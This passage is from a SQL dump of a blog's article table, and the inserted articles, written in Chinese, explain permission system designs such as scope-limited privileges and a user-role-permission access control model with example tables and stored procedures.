/&gt;\r\nname&amp;nbsp;// 项目名&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;\r\n&lt;p&gt;领域对象权限类Priviledge的基本属性如下:&lt;br /&gt;\r\n&lt;em&gt;&lt;strong&gt;id&amp;nbsp;&amp;nbsp;// 权限ID&lt;br /&gt;\r\nuserid&amp;nbsp;&amp;nbsp;// 持有此权限的用户id&lt;br /&gt;\r\nprojectid&amp;nbsp;// 此权限对应的项目&lt;br /&gt;\r\nlevel&amp;nbsp;&amp;nbsp;// 用户的权限等级&lt;br /&gt;\r\n&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;\r\n其中,通过引入了新属性projectid,我们对权限的范围进行了有效限制,项目不同则权限等级再高也是无效,这样就起到了权限范围限制的作用.&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;3.范围限制单项权限系统&lt;br /&gt;\r\n&lt;/strong&gt;在上面两个权限系统中,权限高的自然能执行权限要求低的操作,这样做权力没有细分,在有些场合并不合理,比如即使是董事长不可直接操作人事部的招聘任务,他只对雇员去留有建议权.对于这样的场合我们需要使用范围限制单项权限系统.它的典型应用如工作流和OA系统。&lt;/p&gt;\r\n&lt;p&gt;在范围限制单项权限系统中领域对象用户类User的基本属性如下：&lt;br /&gt;\r\n&lt;em&gt;&lt;strong&gt;id&amp;nbsp;// 用户ID&lt;br /&gt;\r\nname&amp;nbsp;// 用户名&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;\r\n&lt;p&gt;领域对象项目类Project的基本属性如下：&lt;br /&gt;\r\n&lt;em&gt;&lt;strong&gt;id&amp;nbsp;// 项目ID&lt;br /&gt;\r\nname&amp;nbsp;// 项目名&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;\r\n&lt;p&gt;领域对象权限类Priviledge的基本属性如下:&lt;br /&gt;\r\n&lt;em&gt;&lt;strong&gt;id&amp;nbsp;&amp;nbsp;// 权限ID&lt;br /&gt;\r\nuserid&amp;nbsp;&amp;nbsp;// 持有此权限的用户id&lt;br /&gt;\r\nprojectid&amp;nbsp;// 此权限对应的项目&lt;br /&gt;\r\nabilityid&amp;nbsp;// 权限控制能力id&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;\r\n&lt;p&gt;领域对象权限控制能力类ability的基本属性如下:&lt;br /&gt;\r\n&lt;em&gt;&lt;strong&gt;id&amp;nbsp;// 控制能力ID&lt;br /&gt;\r\nitem&amp;nbsp;// 控制能力子项&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;\r\n&lt;p&gt;item的设置示例&lt;br /&gt;\r\nitem&amp;nbsp;对应可执行的功能&lt;br /&gt;\r\n0&amp;nbsp;读&lt;br /&gt;\r\n1&amp;nbsp;写&lt;br /&gt;\r\n2&amp;nbsp;查&lt;br /&gt;\r\n3&amp;nbsp;删&lt;br /&gt;\r\n...&lt;/p&gt;\r\n&lt;p&gt;通过对权限能力的细分,用户权限的控制精度更细了,对功能和流程就能有更精确的把握,更符合复杂的场合.&lt;/p&gt;\r\n&lt;p&gt;以上三种权限系统没有优劣之分只有适用场合的区别,前面的粗略但易于操作,后面的精确但失之烦琐,在现实使用中我们应该根据场合选择合适的权限系统.&lt;/p&gt;\r\n', 1, 1, 0, 0, 1302140626, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(26, 1, '用户认证管理设计思路', '', '', '用户认证管理设计方案&lt;br /&gt;\r\n1 设计思路&lt;br /&gt;\r\n为了设计一套具有较强可扩展性的用户认证管理，需要建立用户、角色和权限等数据库表，并且建立之间的关系，具体实现如下。&lt;br /&gt;\r\n1.1 用户&lt;br /&gt;\r\n用户仅仅是纯粹的用户，用来记录用户相关信息，如用户名、密码等，权限是被分离出去了的。用户（User）要拥有对某种资源的权限，必须通过角色（Role）去关联。&lt;br /&gt;\r\n用户通常具有以下属性：&lt;br /&gt;\r\nü&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 编号，在系统中唯一。&lt;br /&gt;\r\nü&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 名称，在系统中唯一。&lt;br /&gt;\r\nü&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 用户口令。&lt;br /&gt;\r\nü&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 注释，描述用户或角色的信息。&lt;br /&gt;\r\n1.2 角色&lt;br /&gt;\r\n角色是使用权限的基本单位，拥有一定数量的权限，通过角色赋予用户权限，通常具有以下属性：&lt;br /&gt;\r\nü&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 编号，在系统中唯一。&lt;br /&gt;\r\nü&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 名称，在系统中唯一。&lt;br /&gt;\r\nü&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 注释，描述角色信息&lt;br /&gt;\r\n1.3 权限&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 权限指用户根据角色获得对程序某些功能的操作，例如对文件的读、写、修改和删除功能，通常具有以下属性：&lt;br /&gt;\r\nü&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 编号，在系统中唯一。&lt;br /&gt;\r\nü&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 名称，在系统中唯一。&lt;br /&gt;\r\nü&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 注释，描述权限信息&lt;br /&gt;\r\n1.4 用户与角色的关系&lt;br /&gt;\r\n一个用户（User）可以隶属于多个角色（Role），一个角色组也可拥有多个用户，用户角色就是用来描述他们之间隶属关系的对象。用户（User）通过角色（Role）关联所拥有对某种资源的权限，例如&lt;br /&gt;\r\nl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 用户（User）：&lt;br /&gt;\r\nUserID&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; UserName&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; UserPwd&lt;br /&gt;\r\n1&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 张三&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xxxxxx&lt;br /&gt;\r\n2&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 李四&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xxxxxx&amp;nbsp;&amp;nbsp; &amp;nbsp;&lt;br /&gt;\r\n……&lt;br /&gt;\r\nl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 角色（Role）：&lt;br /&gt;\r\nRoleID&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; RoleName&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; RoleNote&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 01&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 系统管理员&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 监控系统维护管理员&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 02&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 监控人员&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 在线监控人员&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 03&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 调度人员&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 调度工作人员&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 04&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 一般工作人员&amp;nbsp;&amp;nbsp; 工作人员&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ……&lt;br /&gt;\r\nl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 用户角色（User_Role）：&lt;br /&gt;\r\nUserRoleID&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; UserID&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; RoleID&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; UserRoleNote&lt;br /&gt;\r\n1&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 01&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 用户“张三”被分配到角色“系统管理员”&lt;br /&gt;\r\n2&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 02&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 用户“李四”被分配到角色“监控人员”&lt;br /&gt;\r\n3&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 03&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 用户“李四”被分配到角色“调度人员”&lt;br /&gt;\r\n……&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 从该关系表可以看出，用户所拥有的特定资源可以通过用户角色来关联。&lt;br /&gt;\r\n1.5 权限与角色的关系&lt;br /&gt;\r\n一个角色（Role）可以拥有多个权限（Permission），同样一个权限可分配给多个角色。例如：&lt;br /&gt;\r\nl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 角色（Role）：&lt;br /&gt;\r\nRoleID&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; RoleName&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; RoleNote&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 01&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 系统管理员&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 监控系统维护管理员&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 02&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 监控人员&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 在线监控人员&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 03&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 调度人员&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 调度工作人员&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 04&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 一般工作人员&amp;nbsp;&amp;nbsp; 工作人员&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ……&lt;br /&gt;\r\nl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 权限（Permission）：&lt;br /&gt;\r\nPermissionID&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; PermissionName&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; PermissionNote&lt;br /&gt;\r\n0001&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 增加监控&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 允许增加监控对象&lt;br /&gt;\r\n0002&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 修改监控&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 允许修改监控对象&lt;br /&gt;\r\n0003&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 删除监控&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 允许删除监控对象&lt;br /&gt;\r\n0004&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 察看监控信息&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 允许察看监控对象&lt;br /&gt;\r\n……&lt;br /&gt;\r\nl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 角色权限（Role_Permission）：&lt;br /&gt;\r\nRolePermissionID&amp;nbsp;&amp;nbsp; RoleID PermissionID RolePermissionNote&lt;br /&gt;\r\n1&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 01&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 0001&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 角色“系统管理员”具有权限“增加监控”&lt;br /&gt;\r\n2&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 01&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 0002&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 角色“系统管理员”具有权限“修改监控”&lt;br /&gt;\r\n3&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 01&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 0003&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 角色“系统管理员”具有权限“删除监控”&lt;br /&gt;\r\n4&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 01&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 0004&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 角色“系统管理员”具有权限“察看监控”&lt;br /&gt;\r\n5&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 02&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 0001&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 角色“监控人员”具有权限“增加监控”&lt;br /&gt;\r\n6&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 02&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 0004&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 角色“监控人员”具有权限“察看监控”&lt;br /&gt;\r\n……&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 由以上例子中的角色权限关系可以看出，角色权限可以建立角色和权限之间的对应关系。&lt;br /&gt;\r\n1.6 建立用户权限&lt;br /&gt;\r\n用户权限系统的核心由以下三部分构成：创造权限、分配权限和使用权限。&lt;br /&gt;\r\n第一步由Creator创造权限（Permission），Creator在设计和实现系统时会划分。利用存储过程CreatePermissionInfo（@PermissionName,@PermissionNote）创建权限信息，指定系统模块具有哪些权限。&lt;br /&gt;\r\n第二步由系统管理员（Administrator）创建用户和角色，并且指定用户角色（User－Role）和角色权限（Role－Permission）的关联关系。&lt;br /&gt;\r\n&lt;br /&gt;\r\n1)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 具有创建用户、修改用户和删除用户的功能： Administrator&lt;br /&gt;\r\nl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 存储过程CreateUserInfo（@UserName,@UserPwd）创建用户信息；&lt;br /&gt;\r\nl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 存储过程ModifyUserInfo（@UserName,@UserPwd）修改用户信息；&lt;br /&gt;\r\nl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 存储过程DeleteUserInfo（@UserID）删除用户信息；&lt;br 